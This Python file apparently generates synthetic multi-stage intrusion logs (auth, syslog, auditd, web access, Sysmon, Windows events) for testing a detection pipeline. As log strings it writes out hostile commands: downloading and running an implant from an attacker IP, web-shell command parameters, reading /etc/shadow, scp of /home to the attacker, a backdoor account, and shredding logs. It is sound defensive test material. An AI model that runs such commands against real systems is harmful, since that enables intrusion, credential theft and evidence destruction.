"""
Generate a synthetic multi-stage attack auth.log for pipeline validation.

Attack stages simulated:
  1. Brute Force        (T1110)     — 15 failed logins over 10 minutes
  2. Initial Access     (T1078)     — successful login as 'admin'
  3. Privilege Escalation (T1548)   — sudo -i to root
  4. Persistence        (T1053.003) — crontab edit
  5. Exfiltration       (T1105)     — wget + chmod

Usage:
    py src/generate_lab.py [output_path]
"""

import sys
from datetime import datetime, timedelta
from pathlib import Path


def generate_lab(
    output_path: Path | None = None,
    attacker_ip: str = '192.168.99.1',
    victim_user: str = 'admin',
    target_host: str = 'server1',
) -> Path:
    """Write a realistic simulated attack auth.log and return its path."""
    if output_path is None:
        output_path = Path(__file__).parent.parent / 'logs' / 'lab_attack.log'
    output_path = Path(output_path)
    output_path.parent.mkdir(parents=True, exist_ok=True)

    base = datetime(2024, 4, 23, 9, 45, 0)
    sshd_base_pid = 4000
    sudo_base_pid = 4100
    t = base
    lines = []

    def ts(dt: datetime) -> str:
        return dt.strftime('%b %d %H:%M:%S')

    # ── Stage 1: Brute Force (15 failed logins, ~40s apart) ───────────────────
    for i in range(15):
        t += timedelta(seconds=40)
        pid = sshd_base_pid + i
        lines.append(
            f"{ts(t)} {target_host} sshd[{pid}]: "
            f"Failed password for root from {attacker_ip} port {22000 + i} ssh2"
        )

    # ── Stage 2: Initial Access ────────────────────────────────────────────────
    t += timedelta(seconds=30)
    access_pid = sshd_base_pid + 15
    lines.append(
        f"{ts(t)} {target_host} sshd[{access_pid}]: "
        f"Accepted password for {victim_user} from {attacker_ip} port 23000 ssh2"
    )
    t += timedelta(seconds=2)
    lines.append(
        f"{ts(t)} {target_host} sshd[{access_pid}]: "
        f"pam_unix(sshd:session): session opened for user {victim_user} by (uid=0)"
    )

    # ── Stage 3: Privilege Escalation (sudo -i) ────────────────────────────────
    t += timedelta(seconds=15)
    lines.append(
        f"{ts(t)} {target_host} sudo[{sudo_base_pid}]: "
        f"{victim_user} : TTY=pts/0 ; PWD=/home/{victim_user} ; USER=root ; "
        f"COMMAND=/bin/bash -i"
    )
    t += timedelta(seconds=3)
    lines.append(
        f"{ts(t)} {target_host} sshd[{access_pid + 1}]: "
        f"pam_unix(sshd:session): session opened for user root by {victim_user}(uid=1001)"
    )

    # ── Stage 4: Persistence (crontab edit) ────────────────────────────────────
    t += timedelta(seconds=20)
    lines.append(
        f"{ts(t)} {target_host} sudo[{sudo_base_pid + 1}]: "
        f"{victim_user} : TTY=pts/0 ; PWD=/root ; USER=root ; "
        f"COMMAND=/usr/bin/crontab -e"
    )

    # ── Stage 5: Exfiltration (wget + chmod) ──────────────────────────────────
    t += timedelta(seconds=10)
    lines.append(
        f"{ts(t)} {target_host} sudo[{sudo_base_pid + 2}]: "
        f"{victim_user} : TTY=pts/0 ; PWD=/root ; USER=root ; "
        f"COMMAND=/usr/bin/wget http://192.168.99.2/exfil.sh -O /tmp/exfil.sh"
    )
    t += timedelta(seconds=5)
    lines.append(
        f"{ts(t)} {target_host} sudo[{sudo_base_pid + 3}]: "
        f"{victim_user} : TTY=pts/0 ; PWD=/root ; USER=root ; "
        f"COMMAND=/bin/chmod +x /tmp/exfil.sh"
    )

    # ── Session close ──────────────────────────────────────────────────────────
    t += timedelta(seconds=30)
    lines.append(
        f"{ts(t)} {target_host} sshd[{access_pid}]: "
        f"pam_unix(sshd:session): session closed for user {victim_user}"
    )

    output_path.write_text('\n'.join(lines) + '\n', encoding='utf-8')
    return output_path


def generate_syslog_lab(
    output_path: Path | None = None,
    target_host: str = 'server1',
) -> Path:
    """Write a synthetic syslog with persistence indicators."""
    if output_path is None:
        output_path = Path(__file__).parent.parent / 'logs' / 'lab_syslog.log'
    output_path = Path(output_path)
    output_path.parent.mkdir(parents=True, exist_ok=True)

    base = datetime(2024, 4, 24, 9, 0, 0)

    def ts(dt: datetime) -> str:
        return dt.strftime('%b %d %H:%M:%S')

    lines = [
        f"{ts(base)}              {target_host} systemd[1]: Started nginx.service.",
        f"{ts(base + timedelta(minutes=15))} {target_host} systemd[1]: Started ssh.service.",
        f"{ts(base + timedelta(minutes=30))} {target_host} CRON[2345]: (root) CMD (/etc/cron.d/persist.sh)",
        f"{ts(base + timedelta(minutes=31))} {target_host} CRON[2346]: (admin) CMD (/home/admin/.backdoor.sh)",
        f"{ts(base + timedelta(minutes=45))} {target_host} kernel[0]: Out of memory: Kill process 3456 (apache2) score 500 or sacrifice child",
        f"{ts(base + timedelta(minutes=50))} {target_host} kernel[0]: usb 1-1: new full-speed USB device number 2 using xhci_hcd",
        f"{ts(base + timedelta(minutes=55))} {target_host} systemd[1]: persist.service: Failed with result 'exit-code'.",
        f"{ts(base + timedelta(hours=1))}    {target_host} systemd[1]: Stopped apache2.service.",
    ]

    output_path.write_text('\n'.join(lines) + '\n', encoding='utf-8')
    return output_path


def generate_audit_lab(
    output_path: Path | None = None,
    attacker_ip: str = '192.168.99.1',
    victim_user: str = 'admin',
) -> Path:
    """Write a synthetic auditd log covering login → exec → shell."""
    if output_path is None:
        output_path = Path(__file__).parent.parent / 'logs' / 'lab_audit.log'
    output_path = Path(output_path)
    output_path.parent.mkdir(parents=True, exist_ok=True)

    base_epoch = 1714000000.0

    def audit_ts(offset: float) -> str:
        return f"{base_epoch + offset:.3f}"

    lines = [
        # Auth failure then successful login
        f'type=USER_AUTH msg=audit({audit_ts(0)}:100): pid=1234 uid=0 auid=4294967295 ses=4294967295 msg=\'op=PAM:authentication acct="{victim_user}" exe="/usr/sbin/sshd" hostname={attacker_ip} addr={attacker_ip} terminal=ssh res=failed\'',
        f'type=USER_LOGIN msg=audit({audit_ts(60)}:101): pid=1235 uid=0 auid=4294967295 ses=1 msg=\'op=login acct="{victim_user}" exe="/usr/sbin/sshd" hostname={attacker_ip} addr={attacker_ip} terminal=ssh res=success\'',
        # Process execution: wget and chmod (post-exploitation)
        f'type=EXECVE msg=audit({audit_ts(90)}:102): argc=3 a0="wget" a1="-q" a2="http://192.168.99.2/malware.sh"',
        f'type=EXECVE msg=audit({audit_ts(100)}:103): argc=3 a0="chmod" a1="+x" a2="/tmp/malware.sh"',
        # Shell spawned
        f'type=SYSCALL msg=audit({audit_ts(110)}:104): arch=c000003e syscall=59 success=yes exit=0 ppid=1235 pid=5678 auid=1001 uid=0 euid=0 comm="bash" exe="/bin/bash" key="shell_exec"',
        # Credential file access
        f'type=OPEN msg=audit({audit_ts(120)}:105): arch=c000003e syscall=2 success=yes exit=3 a0=ffffff9c a1=7f... a2=0 a3=0 ppid=5678 pid=5679 auid=1001 uid=0 name="/etc/shadow" dev=fd:01 ino=12345',
        # Another auth failure
        f'type=USER_AUTH msg=audit({audit_ts(180)}:106): pid=2345 uid=0 auid=4294967295 ses=4294967295 msg=\'op=PAM:authentication acct="root" exe="/usr/sbin/su" hostname=? addr=? terminal=pts/0 res=failed\'',
    ]

    output_path.write_text('\n'.join(lines) + '\n', encoding='utf-8')
    return output_path


def generate_web_lab(
    output_path: Path | None = None,
    attacker_ip: str = '192.168.99.1',
) -> Path:
    """Write a synthetic nginx/apache combined access log with attack patterns."""
    if output_path is None:
        output_path = Path(__file__).parent.parent / 'logs' / 'lab_web.log'
    output_path = Path(output_path)
    output_path.parent.mkdir(parents=True, exist_ok=True)

    base = datetime(2024, 4, 24, 10, 0, 0)

    def wts(dt: datetime) -> str:
        return dt.strftime('%d/%b/%Y:%H:%M:%S +0000')

    a = attacker_ip
    lines = [
        # Normal request
        f'10.0.0.5 - - [{wts(base)}] "GET /index.html HTTP/1.1" 200 1234 "-" "Mozilla/5.0 (Windows NT 10.0)"',
        # Tool fingerprint (sqlmap)
        f'{a} - - [{wts(base + timedelta(seconds=1))}] "GET /login?id=1 HTTP/1.1" 200 512 "-" "sqlmap/1.4.7#stable (https://sqlmap.org)"',
        # Path traversal attack
        f'{a} - - [{wts(base + timedelta(seconds=2))}] "GET /../../etc/passwd HTTP/1.1" 404 256 "-" "curl/7.68.0"',
        # Admin access
        f'{a} - - [{wts(base + timedelta(seconds=3))}] "GET /admin HTTP/1.1" 200 2048 "-" "Mozilla/5.0"',
        # Web shell (POST to .php returning 200)
        f'{a} - - [{wts(base + timedelta(seconds=4))}] "POST /uploads/shell.php HTTP/1.1" 200 128 "-" "python-requests/2.25.1"',
        # Scanning (5+ 404s from same IP with nikto UA)
        f'{a} - - [{wts(base + timedelta(seconds=5))}] "GET /backup HTTP/1.1" 404 0 "-" "nikto/2.1.6"',
        f'{a} - - [{wts(base + timedelta(seconds=6))}] "GET /config.php HTTP/1.1" 404 0 "-" "nikto/2.1.6"',
        f'{a} - - [{wts(base + timedelta(seconds=7))}] "GET /.env HTTP/1.1" 404 0 "-" "nikto/2.1.6"',
        f'{a} - - [{wts(base + timedelta(seconds=8))}] "GET /wp-login.php HTTP/1.1" 404 0 "-" "nikto/2.1.6"',
        f'{a} - - [{wts(base + timedelta(seconds=9))}] "GET /phpmyadmin HTTP/1.1" 404 0 "-" "nikto/2.1.6"',
    ]

    output_path.write_text('\n'.join(lines) + '\n', encoding='utf-8')
    return output_path


def generate_sysmon_linux_lab(
    output_path: Path | None = None,
    attacker_ip: str = '203.0.113.42',
    target_host: str = 'web01',
) -> Path:
    """Write a synthetic Linux Sysmon XML log covering a multi-stage attack."""
    if output_path is None:
        output_path = Path(__file__).parent.parent / 'logs' / 'lab_sysmon_linux.log'
    output_path = Path(output_path)
    output_path.parent.mkdir(parents=True, exist_ok=True)

    base = datetime(2024, 6, 14, 2, 17, 0)
    seq = 5000

    def sysmon_ts(dt: datetime) -> str:
        return dt.strftime('%Y-%m-%dT%H:%M:%S.000000Z')

    def t(minutes: float = 0, seconds: float = 0) -> datetime:
        return base + timedelta(minutes=minutes, seconds=seconds)

    def proc_create(dt, pid, image, cmdline, user='root', ppid=1, parent_image='/bin/bash') -> str:
        nonlocal seq; seq += 1
        return (
            f'<Event><System><Provider Name="Linux-Sysmon"/>'
            f'<EventID>1</EventID>'
            f'<TimeCreated SystemTime="{sysmon_ts(dt)}"/>'
            f'<EventRecordID>{seq}</EventRecordID>'
            f'<Computer>{target_host}</Computer></System>'
            f'<EventData>'
            f'<Data Name="Image">{image}</Data>'
            f'<Data Name="CommandLine">{cmdline}</Data>'
            f'<Data Name="User">{user}</Data>'
            f'<Data Name="ProcessId">{pid}</Data>'
            f'<Data Name="ParentProcessId">{ppid}</Data>'
            f'<Data Name="ParentImage">{parent_image}</Data>'
            f'</EventData></Event>'
        )

    def net_conn(dt, pid, image, dest_ip, dest_port, user='root') -> str:
        nonlocal seq; seq += 1
        return (
            f'<Event><System><Provider Name="Linux-Sysmon"/>'
            f'<EventID>3</EventID>'
            f'<TimeCreated SystemTime="{sysmon_ts(dt)}"/>'
            f'<EventRecordID>{seq}</EventRecordID>'
            f'<Computer>{target_host}</Computer></System>'
            f'<EventData>'
            f'<Data Name="Image">{image}</Data>'
            f'<Data Name="User">{user}</Data>'
            f'<Data Name="DestinationIp">{dest_ip}</Data>'
            f'<Data Name="DestinationPort">{dest_port}</Data>'
            f'<Data Name="Protocol">tcp</Data>'
            f'</EventData></Event>'
        )

    def file_create(dt, pid, image, target, user='root') -> str:
        nonlocal seq; seq += 1
        return (
            f'<Event><System><Provider Name="Linux-Sysmon"/>'
            f'<EventID>11</EventID>'
            f'<TimeCreated SystemTime="{sysmon_ts(dt)}"/>'
            f'<EventRecordID>{seq}</EventRecordID>'
            f'<Computer>{target_host}</Computer></System>'
            f'<EventData>'
            f'<Data Name="Image">{image}</Data>'
            f'<Data Name="TargetFilename">{target}</Data>'
            f'<Data Name="User">{user}</Data>'
            f'<Data Name="ProcessId">{pid}</Data>'
            f'</EventData></Event>'
        )

    def file_delete(dt, pid, image, target, user='root') -> str:
        nonlocal seq; seq += 1
        return (
            f'<Event><System><Provider Name="Linux-Sysmon"/>'
            f'<EventID>23</EventID>'
            f'<TimeCreated SystemTime="{sysmon_ts(dt)}"/>'
            f'<EventRecordID>{seq}</EventRecordID>'
            f'<Computer>{target_host}</Computer></System>'
            f'<EventData>'
            f'<Data Name="Image">{image}</Data>'
            f'<Data Name="TargetFilename">{target}</Data>'
            f'<Data Name="User">{user}</Data>'
            f'<Data Name="ProcessId">{pid}</Data>'
            f'</EventData></Event>'
        )

    lines = [
        # T+00 Shell spawned via web shell
        proc_create(t(0),    9050, '/bin/bash', 'bash -i', user='www-data', ppid=1821, parent_image='/usr/sbin/apache2'),
        # T+01 Discovery
        proc_create(t(1),    9051, '/usr/bin/id',      'id',         user='www-data', ppid=9050),
        proc_create(t(1,10), 9052, '/bin/ps',          'ps aux',     user='www-data', ppid=9050),
        proc_create(t(1,20), 9053, '/bin/netstat',     'netstat -an',user='www-data', ppid=9050),
        proc_create(t(1,30), 9054, '/usr/bin/find',    'find / -perm -4000 -type f', user='www-data', ppid=9050),
        # T+03 Implant download + network connection
        proc_create(t(3),    9055, '/usr/bin/wget',    f'wget -q http://{attacker_ip}/implant.sh -O /tmp/implant.sh', user='www-data', ppid=9050),
        net_conn(t(3,1),     9055, '/usr/bin/wget',    attacker_ip, 80, user='www-data'),
        proc_create(t(3,10), 9056, '/bin/chmod',       'chmod +x /tmp/implant.sh', user='www-data', ppid=9050),
        proc_create(t(3,20), 9057, '/bin/bash',        'bash /tmp/implant.sh', user='www-data', ppid=9050),
        # T+05 Privilege escalation — sudo su
        proc_create(t(5),    9060, '/usr/bin/sudo',    'sudo su -',  user='www-data', ppid=9057),
        proc_create(t(5,5),  9061, '/bin/bash',        'bash -i',    user='root',     ppid=9060),
        # T+08 Persistence — backdoor user + crontab
        proc_create(t(8),    9070, '/usr/sbin/useradd','useradd -m -s /bin/bash svc_monitor', user='root', ppid=9061),
        proc_create(t(8,10), 9071, '/usr/bin/crontab', 'crontab -e', user='root',     ppid=9061),
        file_create(t(8,15), 9071, '/usr/bin/crontab', '/etc/cron.d/svc_monitor',    user='root'),
        # T+10 C2 beacon
        net_conn(t(10),      9057, '/bin/bash',        attacker_ip, 4444, user='root'),
        # T+12 Credential access
        proc_create(t(12),   9080, '/bin/cat',         'cat /etc/shadow', user='root', ppid=9061),
        file_create(t(12,2), 9080, '/bin/cat',         '/etc/shadow',     user='root'),
        # T+15 Exfiltration
        proc_create(t(15),   9090, '/usr/bin/tar',     'tar czf /tmp/loot.tgz /home/', user='root', ppid=9061),
        proc_create(t(15,10),9091, '/usr/bin/scp',     f'scp /tmp/loot.tgz root@{attacker_ip}:/data/', user='root', ppid=9061),
        net_conn(t(15,11),   9091, '/usr/bin/scp',     attacker_ip, 22, user='root'),
        # T+20 Defense evasion — delete logs
        file_delete(t(20),   9100, '/usr/bin/shred',   '/var/log/auth.log',  user='root'),
        file_delete(t(20,5), 9101, '/usr/bin/truncate','/var/log/syslog',    user='root'),
        proc_create(t(20,10),9102, '/usr/bin/history', 'history -c',         user='root', ppid=9061),
    ]

    output_path.write_text('\n'.join(lines) + '\n', encoding='utf-8')
    return output_path


def generate_evtx_attack_log(
    output_path: Path | None = None,
    attacker_ip: str = '192.168.99.1',
    victim_user: str = 'Administrator',
    target_host: str = 'WINSERVER01',
) -> Path:
    """Write a synthetic Windows Event XML attack log and return its path.

    Attack stages:
      1. Brute Force     — 10× EventID 4625 (logon failures, type 3)
      2. Initial Access  — EventID 4624 (type 3 network logon)
      3. Privilege       — EventID 4672 (special privileges assigned)
      4. Execution       — EventID 4688 (powershell.exe with encoded command)
      5. Persistence svc — EventID 4697 (service installed)
      6. Persistence task— EventID 4698 (scheduled task created)

    Output is wevtutil-compatible XML accepted by --fmt evtx.
    """
    if output_path is None:
        output_path = Path(__file__).parent.parent / 'logs' / 'lab_windows_attack.xml'
    output_path = Path(output_path)
    output_path.parent.mkdir(parents=True, exist_ok=True)

    base = datetime(2024, 4, 23, 10, 0, 0)
    seq = 10000

    def wts(dt: datetime) -> str:
        return dt.strftime('%Y-%m-%dT%H:%M:%S.000000000Z')

    def event(dt: datetime, eid: str, data_fields: dict[str, str]) -> str:
        nonlocal seq
        seq += 1
        data_xml = ''.join(
            f'<Data Name="{k}">{v}</Data>' for k, v in data_fields.items()
        )
        return (
            f'<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
            f'<System>'
            f'<Provider Name="Microsoft-Windows-Security-Auditing"/>'
            f'<EventID>{eid}</EventID>'
            f'<TimeCreated SystemTime="{wts(dt)}"/>'
            f'<EventRecordID>{seq}</EventRecordID>'
            f'<Computer>{target_host}</Computer>'
            f'</System>'
            f'<EventData>{data_xml}</EventData>'
            f'</Event>'
        )

    t = base
    evts = []

    # Stage 1: Brute force — 10 logon failures
    for _ in range(10):
        t += timedelta(seconds=30)
        evts.append(event(t, '4625', {
            'TargetUserName': victim_user,
            'IpAddress':      attacker_ip,
            'LogonType':      '3',
            'Status':         '0xc000006d',
            'SubStatus':      '0xc0000064',
        }))

    # Stage 2: Successful network logon
    t += timedelta(seconds=15)
    evts.append(event(t, '4624', {
        'TargetUserName': victim_user,
        'IpAddress':      attacker_ip,
        'LogonType':      '3',
    }))

    # Stage 3: Special privileges assigned (admin token)
    t += timedelta(seconds=2)
    evts.append(event(t, '4672', {
        'SubjectUserName':  victim_user,
        'SubjectDomainName': target_host,
        'PrivilegeList':    'SeDebugPrivilege\r\nSeImpersonatePrivilege',
    }))

    # Stage 4: PowerShell process creation with encoded command
    t += timedelta(seconds=10)
    evts.append(event(t, '4688', {
        'SubjectUserName': victim_user,
        'NewProcessName':  r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe',
        'CommandLine':     'powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgA',
    }))

    # Stage 5: New service installed (persistence)
    t += timedelta(seconds=20)
    evts.append(event(t, '4697', {
        'SubjectUserName':  victim_user,
        'ServiceName':      'SvcMonitor',
        'ServiceFileName':  r'C:\Windows\Temp\svcmon.exe',
        'ServiceType':      '0x10',
        'ServiceStartType': '2',
    }))

    # Stage 6: Scheduled task created
    t += timedelta(seconds=15)
    evts.append(event(t, '4698', {
        'SubjectUserName': victim_user,
        'TaskName':        r'\Microsoft\Windows\SvcMonitor\beacon',
        'TaskContent':     '<Task/>',
    }))

    xml = '<Events>\n' + '\n'.join(evts) + '\n</Events>\n'
    output_path.write_text(xml, encoding='utf-8')
    return output_path


def generate_realistic_incident(
    output_dir: Path | None = None,
    attacker_ip: str = '203.0.113.42',
    victim_user: str = 'deploy',
    target_host: str = 'web01',
) -> dict[str, Path]:
    """
    Generate four correlated log files from the same incident.

    Attack narrative (90 min, same attacker IP across all logs):
      T+00  Web recon      — nikto scan, directory brute-force (web_access)
      T+12  Web exploit    — upload web shell via vulnerable endpoint (web_access)
      T+15  Shell exec     — web shell runs id, uname, ps (auditd)
      T+18  Tool transfer  — wget C2 implant (auditd + auth.log)
      T+22  SSH brute      — 20 failed SSH attempts (auth.log)
      T+32  SSH access     — successful SSH login as deploy (auth.log)
      T+33  Defense evasion— auditd stopped, history cleared (syslog + auditd)
      T+35  Priv esc       — sudo su, session opened as root (auth.log + auditd)
      T+40  Persistence    — new user backdoor, crontab, SSH key (auditd + syslog)
      T+55  Cred access    — /etc/shadow read, hashcat (auditd)
      T+70  Staging        — tar /home, scp to C2 (auditd)
      T+85  Cleanup        — shred auth.log, truncate syslog (auditd)
    """
    if output_dir is None:
        output_dir = Path(__file__).parent.parent / 'logs'
    output_dir = Path(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)

    base = datetime(2024, 6, 14, 2, 17, 0)   # 02:17 — off-hours attack
    a = attacker_ip
    h = target_host
    u = victim_user

    def syslog_ts(dt: datetime) -> str:
        return dt.strftime('%b %d %H:%M:%S')

    def web_ts(dt: datetime) -> str:
        return dt.strftime('%d/%b/%Y:%H:%M:%S +0000')

    def audit_ts(dt: datetime) -> str:
        return f'{dt.timestamp():.3f}'

    def t(minutes: float = 0, seconds: float = 0) -> datetime:
        return base + timedelta(minutes=minutes, seconds=seconds)

    # ── web_access ────────────────────────────────────────────────────────────
    web_lines = [
        # T+00 nikto reconnaissance (12 requests, 9 hit 404)
        f'{a} - - [{web_ts(t(0,0))}] "GET / HTTP/1.1" 200 4823 "-" "Mozilla/5.0 (compatible; Nikto/2.1.6)"',
        f'{a} - - [{web_ts(t(0,4))}] "GET /robots.txt HTTP/1.1" 404 0 "-" "Mozilla/5.0 (compatible; Nikto/2.1.6)"',
        f'{a} - - [{web_ts(t(0,8))}] "GET /admin HTTP/1.1" 302 0 "-" "Mozilla/5.0 (compatible; Nikto/2.1.6)"',
        f'{a} - - [{web_ts(t(0,12))}] "GET /.env HTTP/1.1" 200 312 "-" "Mozilla/5.0 (compatible; Nikto/2.1.6)"',
        f'{a} - - [{web_ts(t(0,16))}] "GET /wp-login.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (compatible; Nikto/2.1.6)"',
        f'{a} - - [{web_ts(t(0,20))}] "GET /phpmyadmin HTTP/1.1" 404 0 "-" "Mozilla/5.0 (compatible; Nikto/2.1.6)"',
        f'{a} - - [{web_ts(t(0,24))}] "GET /backup HTTP/1.1" 404 0 "-" "Mozilla/5.0 (compatible; Nikto/2.1.6)"',
        f'{a} - - [{web_ts(t(0,28))}] "GET /config.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (compatible; Nikto/2.1.6)"',
        f'{a} - - [{web_ts(t(0,32))}] "GET /upload HTTP/1.1" 200 1482 "-" "Mozilla/5.0 (compatible; Nikto/2.1.6)"',
        f'{a} - - [{web_ts(t(0,36))}] "GET /../../etc/passwd HTTP/1.1" 400 0 "-" "Mozilla/5.0 (compatible; Nikto/2.1.6)"',
        # T+05 gobuster directory brute-force (normal browser UA, many 404s)
        f'{a} - - [{web_ts(t(5,0))}] "GET /uploads HTTP/1.1" 200 892 "-" "gobuster/3.1.0"',
        f'{a} - - [{web_ts(t(5,4))}] "GET /uploads/test HTTP/1.1" 404 0 "-" "gobuster/3.1.0"',
        f'{a} - - [{web_ts(t(5,8))}] "GET /api HTTP/1.1" 200 64 "-" "gobuster/3.1.0"',
        f'{a} - - [{web_ts(t(5,12))}] "GET /api/v1 HTTP/1.1" 200 128 "-" "gobuster/3.1.0"',
        f'{a} - - [{web_ts(t(5,16))}] "GET /api/v1/users HTTP/1.1" 403 0 "-" "gobuster/3.1.0"',
        # T+12 web shell upload
        f'{a} - - [{web_ts(t(12,0))}] "POST /upload HTTP/1.1" 200 47 "-" "python-requests/2.28.0"',
        f'{a} - - [{web_ts(t(12,15))}] "POST /uploads/info.php HTTP/1.1" 200 312 "-" "python-requests/2.28.0"',
        # T+13 web shell interaction (cmd execution via GET params)
        f'{a} - - [{web_ts(t(13,0))}] "GET /uploads/info.php?cmd=id HTTP/1.1" 200 28 "-" "curl/7.88.1"',
        f'{a} - - [{web_ts(t(13,10))}] "GET /uploads/info.php?cmd=uname+-a HTTP/1.1" 200 89 "-" "curl/7.88.1"',
        f'{a} - - [{web_ts(t(13,20))}] "GET /uploads/info.php?cmd=cat+/etc/passwd HTTP/1.1" 200 1823 "-" "curl/7.88.1"',
        f'{a} - - [{web_ts(t(13,30))}] "GET /uploads/info.php?cmd=wget+http://{a}/implant.sh HTTP/1.1" 200 0 "-" "curl/7.88.1"',
        # Legitimate traffic baseline
        f'10.0.0.1 - - [{web_ts(t(7,0))}] "GET /api/v1/status HTTP/1.1" 200 44 "-" "HealthCheck/1.0"',
        f'10.0.0.1 - - [{web_ts(t(14,0))}] "GET /api/v1/status HTTP/1.1" 200 44 "-" "HealthCheck/1.0"',
    ]

    # ── auth.log ──────────────────────────────────────────────────────────────
    auth_lines = []
    # T+22 SSH brute force — 20 attempts
    for i in range(20):
        auth_lines.append(
            f'{syslog_ts(t(22, i*25))} {h} sshd[{9000+i}]: '
            f'Failed password for {u} from {a} port {51000+i} ssh2'
        )
    # T+32 successful SSH login
    auth_lines += [
        f'{syslog_ts(t(32,0))} {h} sshd[9100]: Accepted password for {u} from {a} port 52022 ssh2',
        f'{syslog_ts(t(32,2))} {h} sshd[9100]: pam_unix(sshd:session): session opened for user {u} by (uid=0)',
        # T+35 sudo to root
        f'{syslog_ts(t(35,0))} {h} sudo[9200]: {u} : TTY=pts/0 ; PWD=/home/{u} ; USER=root ; COMMAND=/bin/su -',
        f'{syslog_ts(t(35,5))} {h} sshd[9101]: pam_unix(sshd:session): session opened for user root by {u}(uid=1001)',
        # T+40 backdoor user created
        f'{syslog_ts(t(40,0))} {h} sudo[9210]: {u} : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash svc_monitor',
        f'{syslog_ts(t(40,10))} {h} sudo[9211]: {u} : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/passwd svc_monitor',
        # T+85 cleanup
        f'{syslog_ts(t(85,0))} {h} sudo[9300]: {u} : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/shred -u /var/log/auth.log',
        f'{syslog_ts(t(88,0))} {h} sshd[9100]: pam_unix(sshd:session): session closed for user {u}',
    ]

    # ── syslog ────────────────────────────────────────────────────────────────
    syslog_lines = [
        # Normal services before attack
        f'{syslog_ts(t(-30,0))} {h} systemd[1]: Started nginx.service.',
        f'{syslog_ts(t(-25,0))} {h} systemd[1]: Started auditd.service.',
        # T+33 attacker disables auditd and ufw
        f'{syslog_ts(t(33,0))} {h} systemd[1]: Stopping auditd.service...',
        f'{syslog_ts(t(33,5))} {h} systemd[1]: Stopped auditd.service.',
        f'{syslog_ts(t(33,10))} {h} systemd[1]: Stopping ufw.service...',
        f'{syslog_ts(t(33,15))} {h} systemd[1]: Stopped ufw.service.',
        # T+40 persistence via cron
        f'{syslog_ts(t(40,20))} {h} CRON[9220]: (root) CMD (/home/svc_monitor/.local/bin/beacon.sh)',
        f'{syslog_ts(t(40,30))} {h} systemd[1]: Started svc_monitor.service.',
        # T+50 cron fires again (beacon)
        f'{syslog_ts(t(55,0))} {h} CRON[9250]: (root) CMD (/home/svc_monitor/.local/bin/beacon.sh)',
        # T+85 cleanup
        f'{syslog_ts(t(85,10))} {h} sudo[9301]: {u} : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/truncate -s 0 /var/log/syslog',
    ]

    # ── auditd ────────────────────────────────────────────────────────────────
    seq = 200

    def aline(dt: datetime, record_type: str, fields: str) -> str:
        nonlocal seq
        seq += 1
        return f'type={record_type} msg=audit({audit_ts(dt)}:{seq}): {fields}'

    audit_lines = [
        # T+15 web shell process execution (www-data running commands)
        aline(t(15,0),  'EXECVE',   'argc=1 a0="id"'),
        aline(t(15,10), 'EXECVE',   'argc=2 a0="uname" a1="-a"'),
        aline(t(15,20), 'EXECVE',   'argc=2 a0="ps" a1="aux"'),
        aline(t(15,30), 'SYSCALL',  f'arch=c000003e syscall=59 success=yes exit=0 ppid=1821 pid=9050 auid=33 uid=33 euid=33 comm="bash" exe="/bin/bash" key="webshell"'),
        # T+18 implant download via web shell
        aline(t(18,0),  'EXECVE',   f'argc=3 a0="wget" a1="-q" a2="http://{a}/implant.sh"'),
        aline(t(18,10), 'EXECVE',   'argc=3 a0="chmod" a1="+x" a2="/tmp/implant.sh"'),
        aline(t(18,20), 'EXECVE',   'argc=2 a0="bash" a1="/tmp/implant.sh"'),
        # T+32 SSH login recorded by auditd
        aline(t(32,1),  'USER_LOGIN', f'pid=9100 uid=0 auid=4294967295 ses=1 msg=\'op=login acct="{u}" exe="/usr/sbin/sshd" hostname={a} addr={a} terminal=ssh res=success\''),
        # T+33 auditd stopped (last record before gap)
        aline(t(33,0),  'USER_AUTH', f'pid=9110 uid=0 auid=4294967295 ses=4294967295 msg=\'op=PAM:authentication acct="root" exe="/usr/bin/su" hostname=? addr=? terminal=pts/0 res=success\''),
        # T+35 shell and privilege escalation
        aline(t(35,3),  'SYSCALL',  f'arch=c000003e syscall=59 success=yes exit=0 ppid=9100 pid=9200 auid=1001 uid=0 euid=0 comm="bash" exe="/bin/bash" key="privesc"'),
        # T+40 backdoor account and persistence
        aline(t(40,2),  'EXECVE',   'argc=6 a0="useradd" a1="-m" a2="-s" a3="/bin/bash" a4="svc_monitor"'),
        aline(t(40,12), 'EXECVE',   'argc=2 a0="crontab" a1="-e"'),
        aline(t(42,0),  'EXECVE',   'argc=3 a0="ssh-keygen" a1="-t" a2="ed25519"'),
        # T+55 credential access
        aline(t(55,5),  'OPEN',     'arch=c000003e syscall=2 success=yes exit=3 ppid=9200 pid=9260 auid=0 uid=0 name="/etc/shadow" dev=fd:01 ino=131073'),
        aline(t(55,10), 'OPEN',     'arch=c000003e syscall=2 success=yes exit=4 ppid=9200 pid=9261 auid=0 uid=0 name="/etc/passwd" dev=fd:01 ino=131074'),
        aline(t(57,0),  'EXECVE',   'argc=4 a0="hashcat" a1="-m" a2="1800" a3="/tmp/hashes.txt"'),
        # T+70 staging and exfiltration
        aline(t(70,0),  'EXECVE',   'argc=4 a0="tar" a1="czf" a2="/tmp/loot.tgz" a3="/home/"'),
        aline(t(70,30), 'EXECVE',   f'argc=4 a0="scp" a1="/tmp/loot.tgz" a2="root@{a}:/data/"'),
        # T+85 log wiping (defense evasion)
        aline(t(85,0),  'EXECVE',   'argc=3 a0="shred" a1="-u" a2="/var/log/auth.log"'),
        aline(t(85,12), 'EXECVE',   'argc=3 a0="truncate" a1="-s" a2="0"'),
        aline(t(85,20), 'EXECVE',   'argc=2 a0="history" a1="-c"'),
    ]

    paths = {}
    for name, lines in [
        ('incident_web.log',   web_lines),
        ('incident_auth.log',  auth_lines),
        ('incident_syslog.log', syslog_lines),
        ('incident_audit.log', audit_lines),
    ]:
        p = output_dir / name
        p.write_text('\n'.join(lines) + '\n', encoding='utf-8')
        paths[name] = p

    return paths


if __name__ == '__main__':
    out = Path(sys.argv[1]) if len(sys.argv) > 1 else None
